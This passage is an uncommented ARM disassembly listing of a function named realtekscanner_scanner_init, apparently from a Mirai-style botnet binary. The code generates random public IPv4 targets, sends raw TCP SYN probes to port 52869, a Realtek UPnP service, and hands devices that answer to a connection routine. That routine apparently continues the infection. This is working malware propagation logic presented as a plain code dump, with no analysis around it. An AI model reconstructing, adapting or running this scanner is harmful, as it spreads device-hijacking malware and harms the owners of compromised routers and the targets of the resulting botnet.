   129f8:	e1a0318e 	lsl	r3, lr, #3
   129fc:	e0833002 	add	r3, r3, r2
   12a00:	e59d0724 	ldr	r0, [sp, #1828]	; 0x724
   12a04:	e083300e 	add	r3, r3, lr
   12a08:	e1a03103 	lsl	r3, r3, #2
   12a0c:	e1a01280 	lsl	r1, r0, #5
   12a10:	e06e3003 	rsb	r3, lr, r3
   12a14:	e1a02180 	lsl	r2, r0, #3
   12a18:	e59fea28 	ldr	lr, [pc, #2600]	; 13448 <realtekscanner_scanner_init+0xae4>
   12a1c:	e0822001 	add	r2, r2, r1
   12a20:	e59ec000 	ldr	ip, [lr]
   12a24:	e0822000 	add	r2, r2, r0
   12a28:	e280e001 	add	lr, r0, #1
   12a2c:	e1a03183 	lsl	r3, r3, #3
   12a30:	e1a02102 	lsl	r2, r2, #2
   12a34:	e083300c 	add	r3, r3, ip
   12a38:	e0602002 	rsb	r2, r0, r2
   12a3c:	e3a05000 	mov	r5, #0
   12a40:	e3e01000 	mvn	r1, #0
   12a44:	e35e007f 	cmp	lr, #127	; 0x7f
   12a48:	e78c1182 	str	r1, [ip, r2, lsl #3]
   12a4c:	e5835008 	str	r5, [r3, #8]
   12a50:	e58de724 	str	lr, [sp, #1828]	; 0x724
   12a54:	daffffe6 	ble	129f4 <realtekscanner_scanner_init+0x90>
   12a58:	e2811004 	add	r1, r1, #4
   12a5c:	e3a00002 	mov	r0, #2
   12a60:	e3a02006 	mov	r2, #6
   12a64:	eb00117a 	bl	17054 <__GI_socket>
   12a68:	e59f19dc 	ldr	r1, [pc, #2524]	; 1344c <realtekscanner_scanner_init+0xae8>
   12a6c:	e3700001 	cmn	r0, #1
   12a70:	e1a04000 	mov	r4, r0
   12a74:	e5810000 	str	r0, [r1]
   12a78:	0a00014e 	beq	12fb8 <realtekscanner_scanner_init+0x654>
   12a7c:	e3a01003 	mov	r1, #3
   12a80:	e1a02005 	mov	r2, r5
   12a84:	eb000d4a 	bl	15fb4 <__GI___libc_fcntl>
   12a88:	e3a01004 	mov	r1, #4
   12a8c:	e3802b02 	orr	r2, r0, #2048	; 0x800
   12a90:	e1a00004 	mov	r0, r4
   12a94:	eb000d46 	bl	15fb4 <__GI___libc_fcntl>
   12a98:	e28d3e72 	add	r3, sp, #1824	; 0x720
   12a9c:	e2833008 	add	r3, r3, #8
   12aa0:	e3a02001 	mov	r2, #1
   12aa4:	e5232004 	str	r2, [r3, #-4]!
   12aa8:	e59f299c 	ldr	r2, [pc, #2460]	; 1344c <realtekscanner_scanner_init+0xae8>
   12aac:	e3a0c004 	mov	ip, #4
   12ab0:	e5920000 	ldr	r0, [r2]
   12ab4:	e1a01005 	mov	r1, r5
   12ab8:	e3a02003 	mov	r2, #3
   12abc:	e58dc000 	str	ip, [sp]
   12ac0:	eb001151 	bl	1700c <__GI_setsockopt>
   12ac4:	e3500000 	cmp	r0, #0
   12ac8:	1a000137 	bne	12fac <realtekscanner_scanner_init+0x648>
   12acc:	ebfffec9 	bl	125f8 <rand_next>
   12ad0:	e1a00800 	lsl	r0, r0, #16
   12ad4:	e1a0c820 	lsr	ip, r0, #16
   12ad8:	e20c30ff 	and	r3, ip, #255	; 0xff
   12adc:	e1a00c20 	lsr	r0, r0, #24
   12ae0:	e1800403 	orr	r0, r0, r3, lsl #8
   12ae4:	e3500b01 	cmp	r0, #1024	; 0x400
   12ae8:	e58dc014 	str	ip, [sp, #20]
   12aec:	3afffff6 	bcc	12acc <realtekscanner_scanner_init+0x168>
   12af0:	e59fe958 	ldr	lr, [pc, #2392]	; 13450 <realtekscanner_scanner_init+0xaec>
   12af4:	e5de3000 	ldrb	r3, [lr]
   12af8:	e3c3300a 	bic	r3, r3, #10
   12afc:	e3833005 	orr	r3, r3, #5
   12b00:	e5ce3000 	strb	r3, [lr]
   12b04:	e5de2000 	ldrb	r2, [lr]
   12b08:	e3c220b0 	bic	r2, r2, #176	; 0xb0
   12b0c:	e3822040 	orr	r2, r2, #64	; 0x40
   12b10:	e3a01b0a 	mov	r1, #10240	; 0x2800
   12b14:	e5ce2000 	strb	r2, [lr]
   12b18:	e1ce10b2 	strh	r1, [lr, #2]
   12b1c:	ebfffeb5 	bl	125f8 <rand_next>
   12b20:	e59f2928 	ldr	r2, [pc, #2344]	; 13450 <realtekscanner_scanner_init+0xaec>
   12b24:	e282b014 	add	fp, r2, #20
   12b28:	e5db100c 	ldrb	r1, [fp, #12]
   12b2c:	e3a03040 	mov	r3, #64	; 0x40
   12b30:	e5c23008 	strb	r3, [r2, #8]
   12b34:	e3c110a0 	bic	r1, r1, #160	; 0xa0
   12b38:	e59f3910 	ldr	r3, [pc, #2320]	; 13450 <realtekscanner_scanner_init+0xaec>
   12b3c:	e1c200b4 	strh	r0, [r2, #4]
   12b40:	e3811050 	orr	r1, r1, #80	; 0x50
   12b44:	e3a02006 	mov	r2, #6
   12b48:	e3e0cc7a 	mvn	ip, #31232	; 0x7a00
   12b4c:	e5c32009 	strb	r2, [r3, #9]
   12b50:	e24cc031 	sub	ip, ip, #49	; 0x31
   12b54:	e5cb100c 	strb	r1, [fp, #12]
   12b58:	e1cbc0b2 	strh	ip, [fp, #2]
   12b5c:	e59dc014 	ldr	ip, [sp, #20]
   12b60:	e1c3c1b4 	strh	ip, [r3, #20]
   12b64:	ebfffea3 	bl	125f8 <rand_next>
   12b68:	e5db300d 	ldrb	r3, [fp, #13]
   12b6c:	e28de028 	add	lr, sp, #40	; 0x28
   12b70:	e3833002 	orr	r3, r3, #2
   12b74:	e24ee00e 	sub	lr, lr, #14
   12b78:	e5cb300d 	strb	r3, [fp, #13]
   12b7c:	e1cb00be 	strh	r0, [fp, #14]
   12b80:	e58de00c 	str	lr, [sp, #12]
   12b84:	e59f18b8 	ldr	r1, [pc, #2232]	; 13444 <realtekscanner_scanner_init+0xae0>
   12b88:	e5918000 	ldr	r8, [r1]
   12b8c:	e1590008 	cmp	r9, r8
   12b90:	0a000098 	beq	12df8 <realtekscanner_scanner_init+0x494>
   12b94:	e3a03000 	mov	r3, #0
   12b98:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   12b9c:	e3a03000 	mov	r3, #0
   12ba0:	e58d3710 	str	r3, [sp, #1808]	; 0x710
   12ba4:	e58d3704 	str	r3, [sp, #1796]	; 0x704
   12ba8:	e58d3708 	str	r3, [sp, #1800]	; 0x708
   12bac:	e58d370c 	str	r3, [sp, #1804]	; 0x70c
   12bb0:	ebfffe90 	bl	125f8 <rand_next>
   12bb4:	e59f2884 	ldr	r2, [pc, #2180]	; 13440 <realtekscanner_scanner_init+0xadc>
   12bb8:	e59fc890 	ldr	ip, [pc, #2192]	; 13450 <realtekscanner_scanner_init+0xaec>
   12bbc:	e5923000 	ldr	r3, [r2]
   12bc0:	e1cc00b4 	strh	r0, [ip, #4]
   12bc4:	e58c300c 	str	r3, [ip, #12]
   12bc8:	ebfffe8a 	bl	125f8 <rand_next>
   12bcc:	e20040ff 	and	r4, r0, #255	; 0xff
   12bd0:	e1a03420 	lsr	r3, r0, #8
   12bd4:	e1a02820 	lsr	r2, r0, #16
   12bd8:	e3540000 	cmp	r4, #0
   12bdc:	1354007f 	cmpne	r4, #127	; 0x7f
   12be0:	e20350ff 	and	r5, r3, #255	; 0xff
   12be4:	e20270ff 	and	r7, r2, #255	; 0xff
   12be8:	e1a06c20 	lsr	r6, r0, #24
   12bec:	0afffff5 	beq	12bc8 <realtekscanner_scanner_init+0x264>
   12bf0:	e3540003 	cmp	r4, #3
   12bf4:	0afffff3 	beq	12bc8 <realtekscanner_scanner_init+0x264>
   12bf8:	e244300f 	sub	r3, r4, #15
   12bfc:	e3540038 	cmp	r4, #56	; 0x38
   12c00:	13530001 	cmpne	r3, #1
   12c04:	9affffef 	bls	12bc8 <realtekscanner_scanner_init+0x264>
   12c08:	e354000a 	cmp	r4, #10
   12c0c:	0affffed 	beq	12bc8 <realtekscanner_scanner_init+0x264>
   12c10:	e35400c0 	cmp	r4, #192	; 0xc0
   12c14:	035500a8 	cmpeq	r5, #168	; 0xa8
   12c18:	0affffea 	beq	12bc8 <realtekscanner_scanner_init+0x264>
   12c1c:	e35400ac 	cmp	r4, #172	; 0xac
   12c20:	13a03000 	movne	r3, #0
   12c24:	03a03001 	moveq	r3, #1
   12c28:	e355000f 	cmp	r5, #15
   12c2c:	93a03000 	movls	r3, #0
   12c30:	e3530000 	cmp	r3, #0
   12c34:	0a000001 	beq	12c40 <realtekscanner_scanner_init+0x2dc>
   12c38:	e355001f 	cmp	r5, #31
   12c3c:	9affffe1 	bls	12bc8 <realtekscanner_scanner_init+0x264>
   12c40:	e3540064 	cmp	r4, #100	; 0x64
   12c44:	13a03000 	movne	r3, #0
   12c48:	03a03001 	moveq	r3, #1
   12c4c:	e355003f 	cmp	r5, #63	; 0x3f
   12c50:	93a03000 	movls	r3, #0
   12c54:	e3530000 	cmp	r3, #0
   12c58:	0a000001 	beq	12c64 <realtekscanner_scanner_init+0x300>
   12c5c:	e355007e 	cmp	r5, #126	; 0x7e
   12c60:	9affffd8 	bls	12bc8 <realtekscanner_scanner_init+0x264>
   12c64:	e35400a9 	cmp	r4, #169	; 0xa9
   12c68:	035500ff 	cmpeq	r5, #255	; 0xff
   12c6c:	0affffd5 	beq	12bc8 <realtekscanner_scanner_init+0x264>
   12c70:	e35400c6 	cmp	r4, #198	; 0xc6
   12c74:	13a03000 	movne	r3, #0
   12c78:	03a03001 	moveq	r3, #1
   12c7c:	e3550011 	cmp	r5, #17
   12c80:	93a03000 	movls	r3, #0
   12c84:	e3530000 	cmp	r3, #0
   12c88:	0a000001 	beq	12c94 <realtekscanner_scanner_init+0x330>
   12c8c:	e3550013 	cmp	r5, #19
   12c90:	9affffcc 	bls	12bc8 <realtekscanner_scanner_init+0x264>
   12c94:	e35400df 	cmp	r4, #223	; 0xdf
   12c98:	8affffca 	bhi	12bc8 <realtekscanner_scanner_init+0x264>
   12c9c:	e2443006 	sub	r3, r4, #6
   12ca0:	e354000b 	cmp	r4, #11
   12ca4:	13530001 	cmpne	r3, #1
   12ca8:	9affffc6 	bls	12bc8 <realtekscanner_scanner_init+0x264>
   12cac:	e3540016 	cmp	r4, #22
   12cb0:	13540015 	cmpne	r4, #21
   12cb4:	0affffc3 	beq	12bc8 <realtekscanner_scanner_init+0x264>
   12cb8:	e354001c 	cmp	r4, #28
   12cbc:	1354001a 	cmpne	r4, #26
   12cc0:	0affffc0 	beq	12bc8 <realtekscanner_scanner_init+0x264>
   12cc4:	e354001e 	cmp	r4, #30
   12cc8:	1354001d 	cmpne	r4, #29
   12ccc:	0affffbd 	beq	12bc8 <realtekscanner_scanner_init+0x264>
   12cd0:	e3540037 	cmp	r4, #55	; 0x37
   12cd4:	13540021 	cmpne	r4, #33	; 0x21
   12cd8:	0affffba 	beq	12bc8 <realtekscanner_scanner_init+0x264>
   12cdc:	e35400d7 	cmp	r4, #215	; 0xd7
   12ce0:	135400d6 	cmpne	r4, #214	; 0xd6
   12ce4:	0affffb7 	beq	12bc8 <realtekscanner_scanner_init+0x264>
   12ce8:	eb00167d 	bl	186e4 <rand>
   12cec:	e59f3760 	ldr	r3, [pc, #1888]	; 13454 <realtekscanner_scanner_init+0xaf0>
   12cf0:	e0c2e093 	smull	lr, r2, r3, r0
   12cf4:	e0422fc0 	sub	r2, r2, r0, asr #31
   12cf8:	e1a03082 	lsl	r3, r2, #1
   12cfc:	e0833002 	add	r3, r3, r2
   12d00:	e0502003 	subs	r2, r0, r3
   12d04:	03863327 	orreq	r3, r6, #-1677721600	; 0x9c000000
   12d08:	01833805 	orreq	r3, r3, r5, lsl #16
   12d0c:	0a0000f8 	beq	130f4 <realtekscanner_scanner_init+0x790>
   12d10:	e3520001 	cmp	r2, #1
   12d14:	038634c5 	orreq	r3, r6, #-989855744	; 0xc5000000
   12d18:	01833805 	orreq	r3, r3, r5, lsl #16
   12d1c:	0a0000f4 	beq	130f4 <realtekscanner_scanner_init+0x790>
   12d20:	e3520002 	cmp	r2, #2
   12d24:	03863429 	orreq	r3, r6, #687865856	; 0x29000000
   12d28:	01833805 	orreq	r3, r3, r5, lsl #16
   12d2c:	0a0000f0 	beq	130f4 <realtekscanner_scanner_init+0x790>
   12d30:	e3520003 	cmp	r2, #3
   12d34:	0a0000eb 	beq	130e8 <realtekscanner_scanner_init+0x784>
   12d38:	e59f0710 	ldr	r0, [pc, #1808]	; 13450 <realtekscanner_scanner_init+0xaec>
   12d3c:	e59d2010 	ldr	r2, [sp, #16]
   12d40:	e3a03000 	mov	r3, #0
   12d44:	e3a01014 	mov	r1, #20
   12d48:	e5802010 	str	r2, [r0, #16]
   12d4c:	e1c030ba 	strh	r3, [r0, #10]
   12d50:	ebffeec6 	bl	e870 <checksum_generic>
   12d54:	e59fc6f4 	ldr	ip, [pc, #1780]	; 13450 <realtekscanner_scanner_init+0xaec>
   12d58:	e59ce010 	ldr	lr, [ip, #16]
   12d5c:	e1cc00ba 	strh	r0, [ip, #10]
   12d60:	e1a0000c 	mov	r0, ip
   12d64:	e3e0cc7a 	mvn	ip, #31232	; 0x7a00
   12d68:	e24cc031 	sub	ip, ip, #49	; 0x31
   12d6c:	e58be004 	str	lr, [fp, #4]
   12d70:	e3a0e000 	mov	lr, #0
   12d74:	e2801014 	add	r1, r0, #20
   12d78:	e3a02b05 	mov	r2, #5120	; 0x1400
   12d7c:	e3a03014 	mov	r3, #20
   12d80:	e1cbc0b2 	strh	ip, [fp, #2]
   12d84:	e1cbe1b0 	strh	lr, [fp, #16]
   12d88:	ebffeecc 	bl	e8c0 <checksum_tcpudp>
   12d8c:	e59f26bc 	ldr	r2, [pc, #1724]	; 13450 <realtekscanner_scanner_init+0xaec>
   12d90:	e59f16b4 	ldr	r1, [pc, #1716]	; 1344c <realtekscanner_scanner_init+0xae8>
   12d94:	e592e010 	ldr	lr, [r2, #16]
   12d98:	e3a0c010 	mov	ip, #16
   12d9c:	e5913000 	ldr	r3, [r1]
   12da0:	e1cb01b0 	strh	r0, [fp, #16]
   12da4:	e58de708 	str	lr, [sp, #1800]	; 0x708
   12da8:	e58dc004 	str	ip, [sp, #4]
   12dac:	e3a0e002 	mov	lr, #2
   12db0:	e28dcc07 	add	ip, sp, #1792	; 0x700
   12db4:	e1cce0b4 	strh	lr, [ip, #4]
   12db8:	e1dbe0b2 	ldrh	lr, [fp, #2]
   12dbc:	e1cce0b6 	strh	lr, [ip, #6]
   12dc0:	e28dcc07 	add	ip, sp, #1792	; 0x700
   12dc4:	e1a00003 	mov	r0, r3
   12dc8:	e1a01002 	mov	r1, r2
   12dcc:	e3a03901 	mov	r3, #16384	; 0x4000
   12dd0:	e28cc004 	add	ip, ip, #4
   12dd4:	e3a02028 	mov	r2, #40	; 0x28
   12dd8:	e58dc000 	str	ip, [sp]
   12ddc:	eb001068 	bl	16f84 <__libc_sendto>
   12de0:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   12de4:	e2833001 	add	r3, r3, #1
   12de8:	e353009f 	cmp	r3, #159	; 0x9f
   12dec:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   12df0:	daffff69 	ble	12b9c <realtekscanner_scanner_init+0x238>
   12df4:	e1a09008 	mov	r9, r8
   12df8:	eb000e96 	bl	16858 <__GI___errno_location>
   12dfc:	e59de00c 	ldr	lr, [sp, #12]
   12e00:	e1a0a000 	mov	sl, r0
   12e04:	e28e5014 	add	r5, lr, #20
   12e08:	e3a04000 	mov	r4, #0
   12e0c:	e3a0c000 	mov	ip, #0
   12e10:	e58ac000 	str	ip, [sl]
   12e14:	e59f1630 	ldr	r1, [pc, #1584]	; 1344c <realtekscanner_scanner_init+0xae8>
   12e18:	e3a02e5e 	mov	r2, #1504	; 0x5e0
   12e1c:	e5910000 	ldr	r0, [r1]
   12e20:	e282200a 	add	r2, r2, #10
   12e24:	e59d100c 	ldr	r1, [sp, #12]
   12e28:	e3a03901 	mov	r3, #16384	; 0x4000
   12e2c:	e58dc004 	str	ip, [sp, #4]
   12e30:	e58dc000 	str	ip, [sp]
   12e34:	eb000ff0 	bl	16dfc <__libc_recvfrom>
   12e38:	e3500000 	cmp	r0, #0
   12e3c:	da00005f 	ble	12fc0 <realtekscanner_scanner_init+0x65c>
   12e40:	e59a3000 	ldr	r3, [sl]
   12e44:	e353000b 	cmp	r3, #11
   12e48:	0a00005c 	beq	12fc0 <realtekscanner_scanner_init+0x65c>
   12e4c:	e3500027 	cmp	r0, #39	; 0x27
   12e50:	9affffed 	bls	12e0c <realtekscanner_scanner_init+0x4a8>
   12e54:	e59d300c 	ldr	r3, [sp, #12]
   12e58:	e59fc5e0 	ldr	ip, [pc, #1504]	; 13440 <realtekscanner_scanner_init+0xadc>
   12e5c:	e5932010 	ldr	r2, [r3, #16]
   12e60:	e59c3000 	ldr	r3, [ip]
   12e64:	e1520003 	cmp	r2, r3
   12e68:	1affffe7 	bne	12e0c <realtekscanner_scanner_init+0x4a8>
   12e6c:	e59de00c 	ldr	lr, [sp, #12]
   12e70:	e5de3009 	ldrb	r3, [lr, #9]
   12e74:	e3530006 	cmp	r3, #6
   12e78:	1affffe3 	bne	12e0c <realtekscanner_scanner_init+0x4a8>
   12e7c:	e1d560b0 	ldrh	r6, [r5]
   12e80:	e3a03c85 	mov	r3, #34048	; 0x8500
   12e84:	e28330ce 	add	r3, r3, #206	; 0xce
   12e88:	e1560003 	cmp	r6, r3
   12e8c:	1affffde 	bne	12e0c <realtekscanner_scanner_init+0x4a8>
   12e90:	e1d530b2 	ldrh	r3, [r5, #2]
   12e94:	e59d1014 	ldr	r1, [sp, #20]
   12e98:	e1530001 	cmp	r3, r1
   12e9c:	1affffda 	bne	12e0c <realtekscanner_scanner_init+0x4a8>
   12ea0:	e5d5300d 	ldrb	r3, [r5, #13]
   12ea4:	e3130002 	tst	r3, #2
   12ea8:	0affffd7 	beq	12e0c <realtekscanner_scanner_init+0x4a8>
   12eac:	e3130010 	tst	r3, #16
   12eb0:	0affffd5 	beq	12e0c <realtekscanner_scanner_init+0x4a8>
   12eb4:	e3130004 	tst	r3, #4
   12eb8:	1affffd3 	bne	12e0c <realtekscanner_scanner_init+0x4a8>
   12ebc:	e3130001 	tst	r3, #1
   12ec0:	1affffd1 	bne	12e0c <realtekscanner_scanner_init+0x4a8>
   12ec4:	e5951008 	ldr	r1, [r5, #8]
   12ec8:	e20108ff 	and	r0, r1, #16711680	; 0xff0000
   12ecc:	e1a02c21 	lsr	r2, r1, #24
   12ed0:	e2013cff 	and	r3, r1, #65280	; 0xff00
   12ed4:	e1822420 	orr	r2, r2, r0, lsr #8
   12ed8:	e1822403 	orr	r2, r2, r3, lsl #8
   12edc:	e1822c01 	orr	r2, r2, r1, lsl #24
   12ee0:	e2422001 	sub	r2, r2, #1
   12ee4:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
   12ee8:	e1a03c22 	lsr	r3, r2, #24
   12eec:	e1833420 	orr	r3, r3, r0, lsr #8
   12ef0:	e2021cff 	and	r1, r2, #65280	; 0xff00
   12ef4:	e1833401 	orr	r3, r3, r1, lsl #8
   12ef8:	e59ee00c 	ldr	lr, [lr, #12]
   12efc:	e1833c02 	orr	r3, r3, r2, lsl #24
   12f00:	e153000e 	cmp	r3, lr
   12f04:	1affffc0 	bne	12e0c <realtekscanner_scanner_init+0x4a8>
   12f08:	e354007f 	cmp	r4, #127	; 0x7f
   12f0c:	ca00002b 	bgt	12fc0 <realtekscanner_scanner_init+0x65c>
   12f10:	e1a02284 	lsl	r2, r4, #5
   12f14:	e1a03184 	lsl	r3, r4, #3
   12f18:	e0833002 	add	r3, r3, r2
   12f1c:	e0833004 	add	r3, r3, r4
   12f20:	e59f2520 	ldr	r2, [pc, #1312]	; 13448 <realtekscanner_scanner_init+0xae4>
   12f24:	e1a03103 	lsl	r3, r3, #2
   12f28:	e592c000 	ldr	ip, [r2]
   12f2c:	e0643003 	rsb	r3, r4, r3
   12f30:	e1a03183 	lsl	r3, r3, #3
   12f34:	e083000c 	add	r0, r3, ip
   12f38:	e5902008 	ldr	r2, [r0, #8]
   12f3c:	e3520000 	cmp	r2, #0
   12f40:	12843001 	addne	r3, r4, #1
   12f44:	11a02183 	lslne	r2, r3, #3
   12f48:	11a01283 	lslne	r1, r3, #5
   12f4c:	10822001 	addne	r2, r2, r1
   12f50:	10822003 	addne	r2, r2, r3
   12f54:	11a02102 	lslne	r2, r2, #2
   12f58:	10632002 	rsbne	r2, r3, r2
   12f5c:	11a02182 	lslne	r2, r2, #3
   12f60:	108c3002 	addne	r3, ip, r2
   12f64:	11a02004 	movne	r2, r4
   12f68:	0a000009 	beq	12f94 <realtekscanner_scanner_init+0x630>
   12f6c:	e2822001 	add	r2, r2, #1
   12f70:	e3520080 	cmp	r2, #128	; 0x80
   12f74:	0a000011 	beq	12fc0 <realtekscanner_scanner_init+0x65c>
   12f78:	e1a00003 	mov	r0, r3
   12f7c:	e5933008 	ldr	r3, [r3, #8]
   12f80:	e3530000 	cmp	r3, #0
   12f84:	e2803e51 	add	r3, r0, #1296	; 0x510
   12f88:	e2833008 	add	r3, r3, #8
   12f8c:	1afffff6 	bne	12f6c <realtekscanner_scanner_init+0x608>
   12f90:	e1a04002 	mov	r4, r2
   12f94:	e3500000 	cmp	r0, #0
   12f98:	0a000008 	beq	12fc0 <realtekscanner_scanner_init+0x65c>
   12f9c:	e580e00c 	str	lr, [r0, #12]
   12fa0:	e1c061b0 	strh	r6, [r0, #16]
   12fa4:	ebfffe39 	bl	12890 <realtekscanner_setup_connection>
   12fa8:	eaffff97 	b	12e0c <realtekscanner_scanner_init+0x4a8>
   12fac:	e59f3498 	ldr	r3, [pc, #1176]	; 1344c <realtekscanner_scanner_init+0xae8>
   12fb0:	e5930000 	ldr	r0, [r3]
   12fb4:	eb001ba1 	bl	19e40 <__GI___libc_close>
   12fb8:	e1a00005 	mov	r0, r5
   12fbc:	eb0017d6 	bl	18f1c <__GI_exit>
   12fc0:	e3a03000 	mov	r3, #0
   12fc4:	e58d3684 	str	r3, [sp, #1668]	; 0x684
   12fc8:	e3a02004 	mov	r2, #4
   12fcc:	e282cd1a 	add	ip, r2, #1664	; 0x680
   12fd0:	e2822004 	add	r2, r2, #4
   12fd4:	e3a03000 	mov	r3, #0
   12fd8:	e28cc004 	add	ip, ip, #4
   12fdc:	e3520080 	cmp	r2, #128	; 0x80
   12fe0:	e78c300d 	str	r3, [ip, sp]
   12fe4:	1afffff8 	bne	12fcc <realtekscanner_scanner_init+0x668>
   12fe8:	e58d3604 	str	r3, [sp, #1540]	; 0x604
   12fec:	e2833004 	add	r3, r3, #4
   12ff0:	e283ec06 	add	lr, r3, #1536	; 0x600
   12ff4:	e2833004 	add	r3, r3, #4
   12ff8:	e3a02000 	mov	r2, #0
   12ffc:	e28ee004 	add	lr, lr, #4
   13000:	e3530080 	cmp	r3, #128	; 0x80
   13004:	e78e200d 	str	r2, [lr, sp]
   13008:	1afffff8 	bne	12ff0 <realtekscanner_scanner_init+0x68c>
   1300c:	e1a08002 	mov	r8, r2
   13010:	e1a07002 	mov	r7, r2
   13014:	e1a01002 	mov	r1, r2
   13018:	e58d2724 	str	r2, [sp, #1828]	; 0x724
   1301c:	ea000014 	b	13074 <realtekscanner_scanner_init+0x710>
   13020:	e2413001 	sub	r3, r1, #1
   13024:	e3530002 	cmp	r3, #2
   13028:	8a00003a 	bhi	13118 <realtekscanner_scanner_init+0x7b4>
   1302c:	e795c006 	ldr	ip, [r5, r6]
   13030:	e28d3e72 	add	r3, sp, #1824	; 0x720
   13034:	e1a022ac 	lsr	r2, ip, #5
   13038:	e2833008 	add	r3, r3, #8
   1303c:	e1a02102 	lsl	r2, r2, #2
   13040:	e0822003 	add	r2, r2, r3
   13044:	e5121124 	ldr	r1, [r2, #-292]	; 0xfffffedc
   13048:	e20c001f 	and	r0, ip, #31
   1304c:	e3a03001 	mov	r3, #1
   13050:	e1811013 	orr	r1, r1, r3, lsl r0
   13054:	e15c0007 	cmp	ip, r7
   13058:	e5021124 	str	r1, [r2, #-292]	; 0xfffffedc
   1305c:	c1a0700c 	movgt	r7, ip
   13060:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   13064:	e2831001 	add	r1, r3, #1
   13068:	e351007f 	cmp	r1, #127	; 0x7f
   1306c:	e58d1724 	str	r1, [sp, #1828]	; 0x724
   13070:	ca000036 	bgt	13150 <realtekscanner_scanner_init+0x7ec>
   13074:	e1a03181 	lsl	r3, r1, #3
   13078:	e1a02281 	lsl	r2, r1, #5
   1307c:	e0833002 	add	r3, r3, r2
   13080:	e0833001 	add	r3, r3, r1
   13084:	e1a03103 	lsl	r3, r3, #2
   13088:	e0613003 	rsb	r3, r1, r3
   1308c:	e59f13b4 	ldr	r1, [pc, #948]	; 13448 <realtekscanner_scanner_init+0xae4>
   13090:	e5916000 	ldr	r6, [r1]
   13094:	e1a05183 	lsl	r5, r3, #3
   13098:	e0854006 	add	r4, r5, r6
   1309c:	e5941008 	ldr	r1, [r4, #8]
   130a0:	e3510000 	cmp	r1, #0
   130a4:	0affffed 	beq	13060 <realtekscanner_scanner_init+0x6fc>
   130a8:	e59f2394 	ldr	r2, [pc, #916]	; 13444 <realtekscanner_scanner_init+0xae0>
   130ac:	e5923000 	ldr	r3, [r2]
   130b0:	e5942004 	ldr	r2, [r4, #4]
   130b4:	e0623003 	rsb	r3, r2, r3
   130b8:	e3530005 	cmp	r3, #5
   130bc:	9affffd7 	bls	13020 <realtekscanner_scanner_init+0x6bc>
   130c0:	e7950006 	ldr	r0, [r5, r6]
   130c4:	eb001b5d 	bl	19e40 <__GI___libc_close>
   130c8:	e3e03000 	mvn	r3, #0
   130cc:	e3a02000 	mov	r2, #0
   130d0:	e7853006 	str	r3, [r5, r6]
   130d4:	e5842008 	str	r2, [r4, #8]
   130d8:	e2840018 	add	r0, r4, #24
   130dc:	e3a01c01 	mov	r1, #256	; 0x100
   130e0:	eb0006b5 	bl	14bbc <util_zero>
   130e4:	eaffffdd 	b	13060 <realtekscanner_scanner_init+0x6fc>
   130e8:	e1a03805 	lsl	r3, r5, #16
   130ec:	e1833c04 	orr	r3, r3, r4, lsl #24
   130f0:	e1833006 	orr	r3, r3, r6
   130f4:	e1833407 	orr	r3, r3, r7, lsl #8
   130f8:	e20308ff 	and	r0, r3, #16711680	; 0xff0000
   130fc:	e1a02c23 	lsr	r2, r3, #24
   13100:	e2031cff 	and	r1, r3, #65280	; 0xff00
   13104:	e1822420 	orr	r2, r2, r0, lsr #8
   13108:	e1822401 	orr	r2, r2, r1, lsl #8
   1310c:	e1823c03 	orr	r3, r2, r3, lsl #24
   13110:	e58d3010 	str	r3, [sp, #16]
   13114:	eaffff07 	b	12d38 <realtekscanner_scanner_init+0x3d4>
   13118:	e795c006 	ldr	ip, [r5, r6]
   1311c:	e28dee72 	add	lr, sp, #1824	; 0x720
   13120:	e1a032ac 	lsr	r3, ip, #5
   13124:	e1a03103 	lsl	r3, r3, #2
   13128:	e28ee008 	add	lr, lr, #8
   1312c:	e083300e 	add	r3, r3, lr
   13130:	e51320a4 	ldr	r2, [r3, #-164]	; 0xffffff5c
   13134:	e20c001f 	and	r0, ip, #31
   13138:	e3a01001 	mov	r1, #1
   1313c:	e1822011 	orr	r2, r2, r1, lsl r0
   13140:	e158000c 	cmp	r8, ip
   13144:	b1a0800c 	movlt	r8, ip
   13148:	e50320a4 	str	r2, [r3, #-164]	; 0xffffff5c
   1314c:	eaffffc3 	b	13060 <realtekscanner_scanner_init+0x6fc>
   13150:	e3a0c001 	mov	ip, #1
   13154:	e3a04000 	mov	r4, #0
   13158:	e58dc714 	str	ip, [sp, #1812]	; 0x714
   1315c:	e1570008 	cmp	r7, r8
   13160:	a1a00007 	movge	r0, r7
   13164:	b1a00008 	movlt	r0, r8
   13168:	e28d1d1a 	add	r1, sp, #1664	; 0x680
   1316c:	e28d2c06 	add	r2, sp, #1536	; 0x600
   13170:	e28dce71 	add	ip, sp, #1808	; 0x710
   13174:	e28cc004 	add	ip, ip, #4
   13178:	e2811004 	add	r1, r1, #4
   1317c:	e2822004 	add	r2, r2, #4
   13180:	e1a03004 	mov	r3, r4
   13184:	e2800001 	add	r0, r0, #1
   13188:	e58dc000 	str	ip, [sp]
   1318c:	e58d4718 	str	r4, [sp, #1816]	; 0x718
   13190:	eb000c41 	bl	1629c <__libc_select>
   13194:	e1a00004 	mov	r0, r4
   13198:	eb000c93 	bl	163ec <__GI_time>
   1319c:	e59fe2a0 	ldr	lr, [pc, #672]	; 13444 <realtekscanner_scanner_init+0xae0>
   131a0:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   131a4:	e58e0000 	str	r0, [lr]
   131a8:	ea00000b 	b	131dc <realtekscanner_scanner_init+0x878>
   131ac:	e28dee72 	add	lr, sp, #1824	; 0x720
   131b0:	e28ee008 	add	lr, lr, #8
   131b4:	e081200e 	add	r2, r1, lr
   131b8:	e51230a4 	ldr	r3, [r2, #-164]	; 0xffffff5c
   131bc:	e1a03453 	asr	r3, r3, r4
   131c0:	e3130001 	tst	r3, #1
   131c4:	1a000044 	bne	132dc <realtekscanner_scanner_init+0x978>
   131c8:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   131cc:	e2834001 	add	r4, r3, #1
   131d0:	e354007f 	cmp	r4, #127	; 0x7f
   131d4:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   131d8:	cafffe69 	bgt	12b84 <realtekscanner_scanner_init+0x220>
   131dc:	e1a03184 	lsl	r3, r4, #3
   131e0:	e1a02284 	lsl	r2, r4, #5
   131e4:	e0833002 	add	r3, r3, r2
   131e8:	e0833004 	add	r3, r3, r4
